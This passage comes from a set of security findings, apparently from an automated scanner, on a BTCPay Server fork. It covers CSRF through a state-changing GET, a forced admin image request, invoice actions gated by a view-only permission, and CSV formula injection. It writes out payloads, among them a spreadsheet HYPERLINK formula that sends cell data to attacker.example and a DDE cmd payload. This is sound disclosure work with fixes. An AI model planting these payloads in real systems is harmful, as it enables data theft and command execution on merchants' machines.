   POST /api/v1/users likewise stores request.ImageUrl verbatim for a newly created account (including open self-registration via the API).
3. [BTCPayServer/Controllers/UIServerController.Users.cs:103](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L103)
   Admin page GET /server/users/{userId} resolves blob.ImageUrl through UnresolvedUri.Create/UriResolver.Resolve; a non-fileid value comes back verbatim into the view model.
4. [BTCPayServer/UnresolvedUri.cs:8–15](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/UnresolvedUri.cs#L8-L15)
   UnresolvedUri.Create returns FileIdUri only for strings starting with `fileid:`; every other string becomes Raw(str) with no parsing or restriction.
5. [BTCPayServer/Services/UriResolver.cs:24–32](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UriResolver.cs#L24-L32)
   Raw URIs are passed through unchanged; nothing restricts the scheme, host or path at render time.
6. [BTCPayServer/Views/UIServer/User.cshtml:55–61](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIServer/User.cshtml#L55-L61)
   The admin's browser renders <img src="@Model.ImageUrl"> when FileService.IsAvailable() (line 10) is true, issuing a GET to the attacker-chosen URL with the admin's cookies if same-origin, or to the attacker's host if cross-origin.
7. [BTCPayServer/Hosting/MigrationStartupTask.cs:186–199](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/MigrationStartupTask.cs#L186-L199)
   FileSystemStorageAsDefault migration seeds a FileSystem StorageSettings record on every instance where none exists, so FileService.IsAvailable() (`settings is not null`) is true on every deployment and the <img> always renders; file storage need not be configured by the operator.
8. [BTCPayServer/Services/Notifications/Blobs/NewUserRequiresApprovalNotification.cs:55–57](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Notifications/Blobs/NewUserRequiresApprovalNotification.cs#L55-L57)
   The 'new user requires approval' notification's ActionLink points straight at UIServerController.User (/server/users/{userId}); the system itself sends admins to the page that renders the attacker's ImageUrl, so no attacker-induced click is needed (UI:Passive).
9. [BTCPayServer/Controllers/UIServerController.Storage.cs:218–223](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Storage.cs#L218-L223)
   Same-origin target with a side effect: GET /server/storage/FileSystem calls SaveStorageProvider when the saved provider is not FileSystem, switching the server's storage provider and overwriting its configuration (SaveStorageProvider, lines 258-277). The admin's forced image request carries the Identity cookie and satisfies UIServerController's cookie [Authorize], so this executes.
10. [BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs:46–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs#L46-L52)
   Antiforgery validation is skipped for GET/HEAD/TRACE/OPTIONS, so the forced GET is not blocked; no Sec-Fetch-* check exists anywhere in the application.
11. [BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs:20–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs#L20-L28)
   The global AntiXSS CSP sets only script-src 'self'; there is no img-src or default-src, so cross-origin image beacons load from the admin's browser.
12. [BTCPayServer/Controllers/UIManageController.APIKeys.cs:533–559](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.APIKeys.cs#L533-L559)
   Only PolicyType.Server permissions are forbidden to non-admin users creating API keys; btcpay.user.canmodifyprofile is a User policy (Permissions.cs:146), so any registered user can mint a key able to call PUT /api/v1/users/me.

## Impact
Confidentiality LOW: the server admin's IP address, User-Agent and review timing are disclosed to an ordinary user via the cross-origin beacon (works on every deployment). Integrity LOW: on Azure-configured instances, server storage settings are rewritten through the admin's session (provider switched to FileSystem, cloud connection string/container wiped), a server-level setting no sanctioned path grants a non-admin. Availability LOW: until an admin re-enters the provider configuration, all previously uploaded files (branding, CSS, sounds, item images, Greenfield files) resolve to missing /LocalStorage paths and new uploads land on the wrong backend. No other state-changing GET is currently reachable in UIServerController (ApproveUser/ToggleUser GETs only render a confirm view), which bounds the impact.

## Reproduction steps
1. Attacker: any registered user (threat-model adversary 2) holding an API key with btcpay.user.canmodifyprofile (self-mintable) or using Greenfield Basic auth. Step 1: PUT /api/v1/users/me {"imageUrl":"/server/storage/FileSystem"} (or an attacker-hosted URL for the beacon); the attacker learns their own userId from GET /api/v1/users/me. Step 2: wait for an admin to open /server/users/{attackerId}, a routine action the system itself prompts (approval notification ActionLink, Edit/View Invite links on the user list). The admin's browser issues the GET with cookies; no click on attacker content is needed (UI:Passive). The <img> renders on every deployment because StorageSettings is seeded at startup. AT:Present because the integrity/availability effect requires the instance to have switched its storage provider to Azure Blob Storage (GET is a no-op when FileSystem is already active); the IP/UA/timing disclosure and the forced authenticated GET itself need no deployment condition.

## Recommended fix
1. GreenfieldUsersController stores request.ImageUrl without validating that it is a safe, intended reference (the UI paths only ever write fileid: references), so a low-privileged user controls a URL that is later embedded as a sub-resource in administrators' authenticated pages. Fix criteria: ImageUrl accepted through PUT /api/v1/users/me and POST /api/v1/users must be restricted to fileid: references to files the caller owns (or, if remote URLs are to be supported, to absolute https URLs whose host is not this instance and is on an operator-approved list). Verify that relative paths, same-origin absolute URLs and non-https schemes are rejected, and that an already-stored raw value is not rendered as <img src> on /server/users/{id} or any page viewed by another principal.
2. GET /server/storage/{provider} performs a state change (SaveStorageProvider) on a safe HTTP method, so any forced GET carrying the admin cookie (image/audio/link sub-resource, or a cross-site top-level navigation) modifies server configuration without antiforgery protection. Fix criteria: No GET action in UIServerController may persist settings; switching the storage provider must require a POST with a valid antiforgery token. Verify that GET /server/storage/FileSystem while Azure is configured leaves StorageSettings unchanged.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257643

---

# GET /server/storage/FileSystem rewrites server storage settings without antiforgery (CSRF-able state change)

## Details
UIServerController.StorageProvider is routed as [HttpGet("server/storage/{provider}")] on a controller gated by [Authorize(Policy = CanModifyServerSettings, AuthenticationSchemes = Cookie)] (server admins). For provider=FileSystem it does not merely render the edit view: when the saved StorageSettings.Provider is anything else — in practice Azure Blob Storage, the only other provider registered in StorageExtensions.AddProviderStorage (lines 27-28) — it calls SaveStorageProvider(new FileSystemStorageConfiguration(), FileSystem) (UIServerController.Storage.cs:218-223). SaveStorageProvider sets Provider=FileSystem, replaces Configuration with the serialized empty FileSystem configuration and persists it (lines 266-269); the Azure connection string and container are discarded. The EditFileSystemStorageProvider view has no form, so this GET is by design the only way the UI selects FileSystem.

Because the request method is GET, the global antiforgery filter does not validate it (UIControllerAntiforgeryTokenAttribute.cs:46-53), no Referer/Origin/Sec-Fetch check exists, and the Identity cookie is sent on cross-site top-level GET navigations: BTCPayServerServices.cs:935-941 configures only the cookie's paths, leaving ASP.NET Core 10's CookieAuthenticationOptions default SameSite=Lax (assumption about the framework, not overridden anywhere under Hosting/ or Security/). An attacker who gets a logged-in server administrator to visit a page that navigates (window.location, meta refresh, a link) to https://<btcpay-host>/server/storage/FileSystem therefore switches the server's storage provider without any token. The same endpoint is also reachable through any same-origin sub-resource URL a lower-privileged user can plant on an admin-rendered page.

Consequence: every file previously uploaded to Azure (store logos, custom CSS, checkout sounds, PoS/crowdfund item images, server branding logo/theme CSS, Greenfield files) now has its URL computed by the FileSystem provider (FileService.GetFileUrl → /LocalStorage/{storageFileName}) and 404s, /Storage/{fileId} redirects break, and new uploads land on the local disk until an administrator notices and re-enters the Azure configuration. Reachable only when a non-FileSystem provider is configured; if FileSystem is already active the GET is a no-op.

## Evidence
1. [BTCPayServer/Controllers/UIServerController.Storage.cs:218–223](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Storage.cs#L218-L223)
   Inside the [HttpGet("server/storage/{provider}")] StorageProvider action (declared at line 181), the FileSystem case persists new StorageSettings via SaveStorageProvider(new FileSystemStorageConfiguration(), FileSystem) whenever the saved provider differs — a state change performed on a GET.
2. [BTCPayServer/Controllers/UIServerController.Storage.cs:258–276](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Storage.cs#L258-L276)
   SaveStorageProvider overwrites data.Provider and replaces data.Configuration with JObject.FromObject(viewModel) — for FileSystemStorageConfiguration this is {ContainerName:''}, so the previous Azure connection string and container are discarded — then UpdateSetting persists it. ModelState is trivially valid on a GET with no bound body.
3. [BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs:46–53](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs#L46-L53)
   The global UI antiforgery filter's ShouldValidate returns false for GET/HEAD/TRACE/OPTIONS, so this state-changing GET has no CSRF protection; no Referer/Origin/Sec-Fetch check exists elsewhere under Filters/, Security/ or Hosting/.
4. [BTCPayServer/Hosting/BTCPayServerServices.cs:935–940](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L935-L940)
   The Identity application cookie is only PostConfigured with Login/AccessDenied/Logout paths; SameSite is not set, so ASP.NET Core's CookieAuthenticationOptions default (SameSite=Lax) applies and the admin cookie is sent on cross-site top-level GET navigations.
5. [BTCPayServer/Storage/StorageExtensions.cs:27–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Storage/StorageExtensions.cs#L27-L28)
   Only AzureBlobStorageFileProviderService and FileSystemFileProviderService are registered, so the precondition 'saved provider != FileSystem' means Azure Blob Storage is configured; S3/GCS fall into the null case and only redirect.
6. [BTCPayServer/Views/UIServer/EditFileSystemStorageProvider.cshtml:12–23](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIServer/EditFileSystemStorageProvider.cshtml#L12-L23)
   The FileSystem edit view contains no form or save button: the GET side effect is the only path that selects FileSystem in the UI, which is why the fix must move the save into the existing POST server/storage/FileSystem action rather than merely remove it.
7. [BTCPayServer/Storage/Services/FileService.cs:107–115](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Storage/Services/FileService.cs#L107-L115)
   After the switch, GetFileUrl resolves every stored file through the FileSystem provider, so files whose blobs live in Azure get /LocalStorage/{storageFileName} URLs that do not exist on disk; /Storage/{fileId} (UIStorageController) redirects to those dead URLs and new uploads (AddFile) land on local disk.

## Impact
Integrity LOW: a server-level setting (storage provider and its configuration) is overwritten and the cloud connection string/container are dropped from settings; no other setting is reachable. Availability LOW: all stored-file URLs (branding, store logos, CSS, app images) and future uploads are broken until an admin reconfigures the provider; no data in the cloud container is deleted. Confidentiality NONE: nothing is disclosed.

## Reproduction steps
1. Attacker: anyone able to make a logged-in server admin's browser perform a top-level GET to /server/storage/FileSystem (attacker-controlled web page, link in an email/chat, or a planted same-origin sub-resource URL). No token or body is needed; the antiforgery filter skips GET and the Identity cookie is Lax by framework default (ASP.NET Core 10 CookieAuthenticationOptions; not overridden in BTCPayServerServices.cs:935-941), so it is sent on cross-site top-level navigations. Precondition outside the attacker's control (AT:P): the instance must have Azure Blob Storage configured as its file storage provider (non-default), and an admin session must exist in the browser. UI:P — the admin only needs to visit a page.

## Recommended fix
A GET action (StorageProvider) persists StorageSettings as a side effect of rendering the FileSystem edit view, so an unsafe operation is reachable without antiforgery protection. Fix criteria: Rendering GET /server/storage/{provider} must not modify settings; selecting/saving the FileSystem provider must happen only in the POST /server/storage/FileSystem action under the normal antiforgery validation. Verify that with Azure configured, GET /server/storage/FileSystem leaves StorageSettings.Provider and Configuration unchanged.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257587

---

# UI invoice archive, mass-archive and comment writes require only the view-only CanViewInvoices policy

## Details
Three state-changing UI invoice actions in UIInvoiceController are authorized with the read-only policy btcpay.store.canviewinvoices instead of btcpay.store.canmodifyinvoices:

- POST invoices/{invoiceId}/archive (ToggleArchive) toggles the invoice's Archived flag.
- POST invoices/{invoiceId}/comment and /stores/{storeId}/invoices/{invoiceId}/comment (Comment) writes the merchant-visible 'comment' metadata of the invoice.
- POST /stores/{storeId}/invoices/mass-action with command=archive|unarchive (MassAction) bulk-archives/unarchives any invoices of the store.

CanViewInvoices is defined as a leaf permission ('View invoices — Allows viewing invoices.'); CanModifyInvoices ('Allows viewing and modifying invoices') is the policy that includes it. The Greenfield API performs the same operations (ArchiveInvoice, UnarchiveInvoice, UpdateInvoice metadata) under CanModifyInvoices, and the cpfp branch of MassAction explicitly re-checks CanModifyStoreSettings, so the view-only gate on archive/comment is an omission. The Invoice and ListInvoices views render the archive/comment/mass-action forms for every user who can view invoices (no permission tag helper), so the view-only user is even offered the buttons.

Who gains:
1. (Primary) A store member whose custom role grants only btcpay.store.canviewinvoices (or canviewstoresettings). The role editor (Views/Shared/CreateOrEditRole.cshtml) lets a store owner or server admin create exactly such a read-only auditor/accountant role — custom narrow roles are a shipped feature exercised by RolesTests and the 'Multisigner Guest' migration. The permission pipeline resolves the store from the invoiceId/storeId route value, BuiltInPermissionHandler accepts the role via store.HasPolicy(CanViewInvoices), SetContextFilter sets the store, and the action archives/comments the invoice. The same user receives 403 from the Greenfield archive/unarchive/update endpoints. Note that all four default roles (Owner, Manager, Employee, Guest) already include canmodifyinvoices (migration 20240229092905; Playwright cheat/permissions test shows a Guest holds CanModifyInvoices), so a member of a default role gains nothing — the escalation requires a custom view-only role to have been configured.
2. (Secondary) A server admin who is not a member of the store: BuiltInPermissionHandler grants admins the CanViewStoreSettings subtree on every store, which is meant to be read-only, so an admin can archive/unarchive and comment on any store's invoices through the UI while Greenfield refuses the same admin. GetUserIdForInvoiceQuery() returns null for admins so Comment's membership filter is bypassed too. This path adds little in practice because the built-in Impersonation plugin already lets a server admin impersonate any non-admin user, but it contradicts the admin read-only design.

Impact: integrity of another principal's invoice records within the store. Archiving removes invoices from the merchant's default invoice list (InvoiceQuery.IncludeArchived defaults to false unless the 'includearchived' filter is set), so paid orders can be hidden from staff; the comment is free text shown to all store members on the invoice page and list and included in the Invoices report (UnitTest1 confirms the InvoiceComment column). No funds move, payment state is unchanged (ChangeInvoiceState is correctly gated by CanManageInvoiceStatus), and nothing beyond what the view permission already shows is disclosed, so the impact is low, but it crosses the role/permission boundary the project enforces for these operations everywhere else.

## Evidence
1. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:609–623](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L609-L623)
   ToggleArchive (POST invoices/{invoiceId}/archive) is authorized with Policies.CanViewInvoices yet flips the invoice's Archived flag via _InvoiceRepository.ToggleInvoiceArchival(storeId, invoiceId). No further permission check follows.
2. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:625–650](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L625-L650)
   Comment (POST invoices/{invoiceId}/comment and /stores/{storeId}/invoices/{invoiceId}/comment) is authorized with CanViewInvoices yet writes the invoice's 'comment' metadata through UpdateInvoiceMetadata(invoiceId, "comment", ...). The UserId filter is GetUserIdForInvoiceQuery(), which is null for server admins, so a non-member admin passes the lookup as well.
3. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:652–676](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L652-L676)
   MassAction (POST /stores/{storeId}/invoices/mass-action) is authorized with CanViewInvoices; the archive and unarchive branches call MassArchive(storeId, selectedItems) for every selected invoice of the store without any further check, while the cpfp branch explicitly re-checks CanModifyStoreSettings.
4. [BTCPayServer/Hosting/BTCPayServerServices.cs:549–564](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L549-L564)
   PolicyDefinition of CanViewInvoices is a leaf permission displayed as 'View invoices — Allows viewing invoices.'; CanModifyInvoices ('Allows viewing and modifying invoices') is the policy that includes it. The UI mutations therefore accept a permission whose documented meaning is read-only.
5. [BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs:140–157](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs#L140-L157)
   The Greenfield equivalents ArchiveInvoice (DELETE) and UpdateInvoice (PUT, metadata) require Policies.CanModifyInvoices, establishing the intended permission level for archiving and metadata writes; the UI endpoints demand a strictly weaker policy.
6. [BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs:265–269](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs#L265-L269)
   Greenfield UnarchiveInvoice also requires CanModifyInvoices.
7. [BTCPayServer/Views/Shared/CreateOrEditRole.cshtml:21](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/CreateOrEditRole.cshtml#L21)
   The store/server role editor offers every PolicyType.Store policy individually, so a store owner (POST {storeId}/roles/{role}, CanModifyStoreSettings) or server admin can create a custom role granting only btcpay.store.canviewinvoices — the deliberately read-only role that this bug lets mutate invoices.
8. [BTCPayServer/Security/BuiltInPermissionHandler.cs:23–45](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/BuiltInPermissionHandler.cs#L23-L45)
   For Store-type policies a server admin who is not a member of the store is granted every policy under CanViewStoreSettings (ServerAdminRolePermissions). CanViewInvoices is in that subtree, so a non-member admin also satisfies the gate of these write actions on any store, while the same admin is refused by the Greenfield CanModifyInvoices endpoints.
9. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:1316](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L1316)
   GetUserIdForInvoiceQuery returns null for ServerAdmin, so the invoice lookup in Comment does not require store membership for admins.

## Impact
The attacker can archive/unarchive any invoice of the store (hiding it from the default invoice list) and overwrite its comment metadata (shown to all members and in the Invoices report), altering records other members rely on. They cannot read anything beyond what the view permission already allows, cannot change payment status or move funds, and availability is unaffected.

## Reproduction steps
1. Attacker is an authenticated store member holding only a view-level store permission. Lowest-privilege path: a member assigned a custom role limited to btcpay.store.canviewinvoices/canviewstoresettings (PR LOW); this depends on such a role existing, since every default role already includes canmodifyinvoices (AT PRESENT). The member loads the invoice page or list (permitted by CanViewInvoices), obtains the antiforgery token from the rendered form, and POSTs archive, comment or mass-action; no victim interaction or other condition is needed. The secondary admin path (non-member server admin, PR HIGH, no configuration needed) gains little beyond what Impersonation already concedes to admins.

## Recommended fix
ToggleArchive, Comment and the archive/unarchive branches of MassAction mutate invoice state while being authorized with the read-only policy CanViewInvoices, inconsistent with the Greenfield endpoints and the permission hierarchy, and reachable by non-member server admins through the admin read-only subtree. Fix criteria: The three UI mutations require a modify-level store permission (CanModifyInvoices or stronger), evaluated against the invoice's store, so that a member holding only view permissions and a server admin who is not a store member receive 403 from the UI exactly as they do from the Greenfield archive/unarchive/update endpoints; the Invoice and ListInvoices views hide the archive, comment and mass-action controls from users lacking that permission. Verify by posting each form with a custom view-only role and with a non-member admin account.

---
**Severity:** LOW
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257586

---

# CSV formula injection in report export of payer-controlled invoice metadata

## Details
The Reports page exports the raw report rows to CSV entirely client-side via `Papa.unparse` (store-reports.js downloadCSV). The vendored PapaParse 5.4.1 only prefixes formula-trigger cells with a quote when the `escapeFormulae` option is supplied; BTCPay does not supply it, so any cell whose text starts with `=`, `+`, `-`, `@`, tab or carriage return is written as-is.

The Invoices report flattens the whole invoice metadata into columns (InvoicesReportProvider.FlattenFields), and parts of that metadata are authored by anonymous payers. The simplest vector needs no store configuration: the anonymous PoS checkout POST `/apps/{appId}/pos` (UIPointOfSaleController.ViewPointOfSale, [IgnoreAntiforgeryToken], CORS All) accepts a free-form `orderId` parameter and stores it as metadata OrderId (line 406), which becomes the `orderId` report column. If the PoS app has a checkout form, the payer's answers (name, address, custom fields; only Required/email syntax is validated) are merged into the metadata as well (lines 427-432). A payer can therefore submit `=HYPERLINK("https://attacker.example/?"&A1,"Open invoice")` or `=cmd|' /C calc'!A0` as the order id or a form answer. When a store member later clicks Export on the Reports page and opens export.csv in Excel/LibreOffice, the cell is evaluated as a formula: HYPERLINK-style payloads exfiltrate other cells of the merchant's sheet on click, DDE-style payloads prompt for command execution.

This is CWE-1236 (Improper Neutralization of Formula Elements in a CSV File). BTCPay itself is not compromised; the impact lands on the merchant's spreadsheet/workstation (subsequent system), requires the merchant to export and open the file and, for command execution, to accept the spreadsheet's warnings, hence low severity. Assumption: PapaParse 5.4.1 behaviour as read from the vendored minified file (escaping regex set only when escapeFormulae is passed). The server-side CSV exports elsewhere (wallet transactions export) were not examined; the finding is specific to the client-side report export.

## Evidence
1. [BTCPayServer/wwwroot/js/store-reports.js:145–155](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/js/store-reports.js#L145-L155)
   downloadCSV() clones the raw report rows and serialises them with Papa.unparse({fields, data}) into export.csv. No escapeFormulae option is passed; in the vendored PapaParse 5.4.1 (wwwroot/vendor/papaparse/papaparse.min.js) the formula-escaping regex is only installed when that option is supplied, so a cell beginning with = + - @ tab or CR is emitted verbatim (quoting, when it happens, does not stop Excel/LibreOffice from evaluating it).
2. [BTCPayServer/Services/Reporting/InvoicesReportProvider.cs:232–292](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/InvoicesReportProvider.cs#L232-L292)
   FlattenFields() walks the invoice metadata JObject and TryAdd()s every scalar (except itemDesc, receiptData and posData.tax) as a report column with the raw string value, so payer-authored metadata (orderId, form answers such as buyerName/buyerAddress1, custom fields) becomes CSV cells unchanged. Only names already in the base view definition are skipped (MetadataFields.TryAdd, lines 35-49).
3. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:406](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L406)
   The anonymous PoS checkout POST (/apps/{appId}/pos, lines 186-199: no [Authorize], [IgnoreAntiforgeryToken], CORS All) takes a free-form `orderId` string from the request and stores it as metadata OrderId when non-null. No form needs to be configured on the app: any payer can POST orderId="=HYPERLINK(...)" and it lands in the Invoices report's orderId column.
4. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:427–432](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L427-L432)
   When the PoS app has a checkout form, the payer's answers (FormDataService.GetValues: the submitted strings; HtmlInputFormProvider.Validate only checks Required and, for type email, mailbox syntax) are merged into the invoice metadata, giving further free-text cells (name, address, custom fields) in the report.
5. [BTCPayServer/Views/UIReports/StoreReports.cshtml:43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIReports/StoreReports.cshtml#L43)
   The Export button (data-action=exportCSV) is the page's primary action for store members with CanViewReports; exporting and opening the file in a spreadsheet is the intended workflow.

## Impact
BTCPay itself is not compromised; the exported report artifact is tampered so that the merchant's spreadsheet shows attacker-chosen cells/links (minor integrity impact on the report). Subsequent-system impact: In the merchant's spreadsheet application the formula can leak other cell contents of the opened report to an attacker URL (HYPERLINK/WEBSERVICE-style) or, with DDE and user-accepted prompts, run a command on the workstation; confidentiality and integrity of the merchant's workstation data are affected to a limited degree.

## Reproduction steps
1. An anonymous payer POSTs the public PoS checkout with an orderId (or, if the app has a form, a free-text answer) starting with a formula trigger character; the value is stored in invoice metadata and surfaces as a cell in the Invoices report. A store member with CanViewReports clicks Export and opens export.csv in a spreadsheet, which evaluates the formula (DDE variants additionally require accepting warnings). No neutralisation exists anywhere in the export path, and no store configuration is required for the orderId vector.

## Recommended fix
downloadCSV() writes report cells into the CSV without neutralising spreadsheet formula triggers, while report rows contain text authored by untrusted payers (PoS orderId, checkout-form answers, other metadata). Fix criteria: Every exported cell whose value begins with =, +, -, @, tab or carriage return is neutralised (e.g. Papa.unparse escapeFormulae enabled, or an explicit single-quote prefix) so spreadsheets treat it as text. Verify: an invoice created via the PoS POST with orderId `=HYPERLINK("https://x","y")` exports as a literal string that no spreadsheet evaluates.

---
**Severity:** LOW
**Status:** Open
**Category:** CSV injection
**CWE:** [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257582

---

# Recovery-seed page renders any attacker-supplied mnemonic as the user's wallet seed via GET

## Details
UIHomeController.RecoverySeedBackup (BTCPayServer/Controllers/UIHomeController.cs:191-196) is the page BTCPay uses to show a freshly generated hot-wallet seed (GenerateWallet, UIStoreOnChainWalletsController.cs:404-416) and the stored hot-wallet seed (WalletSeed, lines 631-655) to a store owner. It is routed with [Route("recovery-seed-backup")] and no HTTP-verb constraint, so it answers GET, and its RecoverySeedBackupViewModel (Mnemonic, Passphrase, IsStored, RequireConfirm, ReturnUrl, CryptoCode) is bound by the default model binder from the query string. The action passes the model straight to the view, which renders whatever words it receives under 'Secure your recovery phrase ... Write them down on a piece of paper in the exact order', and when isStored=true adds the server's own assurance 'The recovery phrase will also be stored on the server as a hot wallet'. Nothing ties the displayed mnemonic to a wallet the user generated or owns; the only first-party producer is the auto-submitting PostRedirect form (Extensions.cs:1004-1021), and the controller cannot tell it apart from a GET link.

